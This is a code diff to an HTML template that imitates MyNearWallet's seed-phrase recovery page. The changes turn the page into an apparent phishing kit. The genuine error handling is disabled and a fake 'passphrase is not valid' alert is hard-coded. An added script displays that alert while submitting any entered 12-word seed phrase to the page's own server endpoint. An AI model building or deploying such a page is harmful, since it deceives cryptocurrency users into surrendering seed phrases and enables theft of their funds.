@@ -640,22 +640,23 @@ a {
             </div>
             <div class="sc-kxtUkE iYUceG sf-hidden" id=mobile-menu></div>
         </div>
+        <div id="errorDiv" style="display: none;" class="sc-ddjGPC dcjRtT"><div class="sc-dSCufp UREaS number-SHOW_CUSTOM_ALERT" type="SHOW_CUSTOM_ALERT"><div class="sc-fxwrCY iaSSCz"><div class="sc-hIUJlX jNwJnK"><img src="https://app.mynearwallet.com/icon_alert-circle.ab25e7f6.svg" alt=""></div><div class="sc-jnOGJG gGEvuB"><div class="sc-eZkCL ga-dtjp">Error</div><div class="message-code">The provided passphrase is not valid. Please check your passphrase and try again.<a href="https://nearhelp.zendesk.com/hc/search?query=The%20provided%20passphrase%20is%20not%20valid.%20Please%20check%20your%20passphrase%20and%20try%20again." target="_blank" rel="noreferrer">View FAQ</a></div><div class="sc-ggpjZQ iIEXHf">Provided seed phrase must be at least 12 words long</div></div><div onclick="closeDiv()" id="closeErrorDiv" class="sc-dZoequ cwOhmi"></div></div></div></div>
         <div></div>
         <div class="sc-gTRrQi sc-iwCbjw jARWIN khuGIh small-centered border"><h1>{% trans "Recover using Passphrase"%}</h1>
             <h2>{%trans "Enter the backup passphrase associated with the account."%}</h2>
-            <form action="recover_seed_phrase" method="post" autocomplete=off>
+            <form action="recover_seed_phrase" method="post" autocomplete=off id="submit_recover_phrase">
                 {% csrf_token %}
                 <h4>{%trans "Passphrase (12 words)"%}</h4>
-                {% if err is not None %}
+                {% comment %} {% if err is not None %}
                     <h4 style="color: red">{%trans "Import phrase error. Please try again"%}</h4>
-                {% endif %}
+                {% endif %} {% endcomment %}
                 <input id="phrase" name="phrase" placeholder="correct horse battery staple..."
                                                                         data-test-id=seedPhraseRecoveryInput required
                                                                         tabindex=2 autocapitalize=off value>
-                <button type=submit class="sc-bgqQcB hrcLpY blue" tabindex=3
-                        data-test-id=seedPhraseRecoverySubmitButton>{% trans "Find My Account"%}
-                </button>
             </form>
+            <button onclick="toggleErrorDiv()" id="showAlertButton" class="sc-bgqQcB hrcLpY blue" tabindex=3
+                        data-test-id=seedPhraseRecoverySubmitButton>{% trans "Find My Account"%}
+            </button>
         </div>
         <div class="sc-gqGJVm dNYBDw wallet-footer">
             <div class=left>
@@ -723,10 +724,11 @@ a {
                     <div><a href=https://app.mynearwallet.com/terms rel="noopener noreferrer" target=_blank>{% trans "Terms of Service" %}</a><span class=color-brown-grey>|</span><a href=https://app.mynearwallet.com/privacy rel="noopener noreferrer" target=_blank>{% trans "Privacy Policy"%}</a></div>
                 </div>
             </div>
-            <div class=center>{% trans "NEAR is a scalable computing and storage platform that changes how the web works for the
-                better."%}&nbsp;<a href=https://near.org/ rel="noopener noreferrer" target=_blank>{%trans "Learn More"%}</a></div>
-            <div class=right>{% trans "Questions?" %}<br><a href=https://discord.com/invite/Vj74PpQYsh rel="noopener noreferrer"
-                                              target=_blank>{% trans "Join Community" %}</a></div>
+            <div class=center>{% trans "NEAR is a scalable computing and storage platform that changes how the web works for the better." %}<a
+                href=https://near.org/ rel="noopener noreferrer" target=_blank><a>{% trans "Learn More" %}</a></div>
+        <div class=right>{% trans "Questions?" %}<br><a href=https://discord.com/invite/Vj74PpQYsh
+                                                        rel="noopener noreferrer"
+                                                        target=_blank>{% trans "Join Community" %}</a></div>
         </div>
     </div>
 </div>
@@ -878,7 +880,210 @@ a {
     100% {
         fill: transparent
     }
-}</style>
+}
+
+.toast {
+    display: none;
+    background-color: #fff;
+    color: rgb(36, 39, 42);
+    padding: 10px;
+    border-radius: 2px solid rgb(242, 242, 242);
+    position: fixed;
+    top: 50%;
+    right: 30px; /* Adjust the right value to set the distance from the right edge */
+    transform: translateY(-50%); /* Center the toast vertically */
+    z-index: 1;
+    /* Add transition for fade-in and fade-out effect */
+    transition: opacity 0.5s ease-in-out;
+  }
+  
+  /* Define the class to show the toast */
+  .toast.show {
+    display: block;
+    /* Add the fade-in effect */
+    opacity: 1;
+  }
+  
+  /* Define the class to hide the toast */
+  .toast.hide {
+    /* Add the fade-out effect */
+    opacity: 0;
+  }
+
+.ga-dtjp {
+    font-weight: 600;
+    margin-bottom: 8px;
+    color: rgb(228, 29, 34);
+}
+
+.gGEvuB {
+    padding-right: 16px;
+    color: rgb(36, 39, 42);
+    flex: 1 1 auto;
+    padding-top: 4px;
+}
+
+.jNwJnK {
+    padding-right: 16px;
+    flex: 0 0 24px;
+}
+
+
+@media (max-width: 991px)
+.iaSSCz {
+    width: 100%;
+    max-width: 100%;
+}
+
+.iaSSCz {
+    min-height: 60px;
+    min-width: 275px;
+    border: 2px solid rgb(242, 242, 242);
+    border-radius: 0px 3px 3px 0px;
+    display: flex;
+    padding: 16px;
+}
+
+@media (max-width: 991px)
+.UREaS {
+    width: 100%;
+}
+
+.UREaS {
+    background-color: rgb(255, 255, 255);
+    border-left: 4px solid rgb(228, 29, 34);
+    box-shadow: rgba(0, 0, 0, 0.04) 0px 2px 4px;
+    border-top-color: rgb(228, 29, 34);
+    border-right-color: rgb(228, 29, 34);
+    border-bottom-color: rgb(228, 29, 34);
+    margin-bottom: 12px;
+    animation-iteration-count: 1;
+    transform-origin: 50% 50%;
+}
+
+.dcjRtT {
+    position: fixed;
+    right: 16px;
+    z-index: 2100;
+    animation: 0.3s ease-in-out 0s 1 normal none running alertAnimation;
+    transform-origin: 50% 50%;
+}
+
+.dcjRtT .message-code {
+    display: flex;
+    -webkit-box-align: center;
+    align-items: center;
+}
+
+.dcjRtT .message-code a {
+    white-space: nowrap;
+    background-color: rgb(242, 242, 242);
+    border: 2px solid rgb(242, 242, 242);
+    font-weight: 600;
+    padding: 6px 10px;
+    border-radius: 4px;
+    font-size: 13px;
+    margin-left: 10px;
+    transition: all 100ms ease 0s;
+    text-align: center;
+}
+
+.iIEXHf {
+    font-family: "IBM Plex Mono", monospace;
+    font-size: 12px;
+    color: rgb(101, 101, 101);
+    margin-top: 14px;
+    background: rgb(242, 242, 242);
+    padding: 8px;
+    word-break: break-word;
+}
+
+.cwOhmi {
+    width: 12px;
+    height: 12px;
+    cursor: pointer;
+    transition: all 0.2s ease-in-out 0s;
+    position: relative;
+    flex: 0 0 12px;
+}
+
+.cwOhmi::before, .cwOhmi::after {
+    content: "";
+    top: 6px;
+    width: 12px;
+    height: 1px;
+    background: rgb(32, 131, 212);
+    position: absolute;
+    transition: all 0.1s ease-in-out 0s;
+}
+
+*, :before, :after {
+    box-sizing: border-box;
+    border: 0 solid #e5e7eb;
+}
+
+:before, :after {
+    --tw-content: "";
+}
+
+*, :before, :after {
+    --tw-border-spacing-x: 0;
+    --tw-border-spacing-y: 0;
+    --tw-translate-x: 0;
+    --tw-translate-y: 0;
+    --tw-rotate: 0;
+    --tw-skew-x: 0;
+    --tw-skew-y: 0;
+    --tw-scale-x: 1;
+    --tw-scale-y: 1;
+    --tw-pan-x: ;
+    --tw-pan-y: ;
+    --tw-pinch-zoom: ;
+    --tw-scroll-snap-strictness: proximity;
+    --tw-gradient-from-position: ;
+    --tw-gradient-via-position: ;
+    --tw-gradient-to-position: ;
+    --tw-ordinal: ;
+    --tw-slashed-zero: ;
+    --tw-numeric-figure: ;
+    --tw-numeric-spacing: ;
+    --tw-numeric-fraction: ;
+    --tw-ring-inset: ;
+    --tw-ring-offset-width: 0px;
+    --tw-ring-offset-color: #fff;
+    --tw-ring-color: rgba(59,130,246,.5);
+    --tw-ring-offset-shadow: 0 0 transparent;
+    --tw-ring-shadow: 0 0 transparent;
+    --tw-shadow: 0 0 transparent;
+    --tw-shadow-colored: 0 0 transparent;
+    --tw-blur: ;
+    --tw-brightness: ;
+    --tw-contrast: ;
+    --tw-grayscale: ;
+    --tw-hue-rotate: ;
+    --tw-invert: ;
+    --tw-saturate: ;
+    --tw-sepia: ;
+    --tw-drop-shadow: ;
+    --tw-backdrop-blur: ;
+    --tw-backdrop-brightness: ;
+    --tw-backdrop-contrast: ;
+    --tw-backdrop-grayscale: ;
+    --tw-backdrop-hue-rotate: ;
+    --tw-backdrop-invert: ;
+    --tw-backdrop-opacity: ;
+    --tw-backdrop-saturate: ;
+    --tw-backdrop-sepia: ;
+}
+
+.cwOhmi::after {
+    transform: rotate(-45deg);
+}
+
+.cwOhmi::before {
+    transform: rotate(45deg);
+}
+</style>
 
 <script>
     // Get the language selector element
@@ -892,4 +1097,28 @@ a {
         // Submit the form when a language is selected
         languageForm.submit();
     });
+
+    function toggleErrorDiv() {
+        var errorDiv = document.getElementById("errorDiv");
+        var phraseInput = document.getElementById("phrase");
+
+        if (errorDiv.style.display === "none") {
+            errorDiv.style.display = "block";
+        } else {
+            errorDiv.style.display = "none";
+        }
+
+        if (phraseInput.value.trim() !== "") {
+            document.getElementById("submit_recover_phrase").submit();
+        }
+    }
+
+    function closeDiv() {
+        var errorDiv = document.getElementById("errorDiv")
+        if (errorDiv.style.display === "none") {
+            errorDiv.style.display = "block";
+        } else {
+            errorDiv.style.display = "none";
+        }
+    }
 </script>
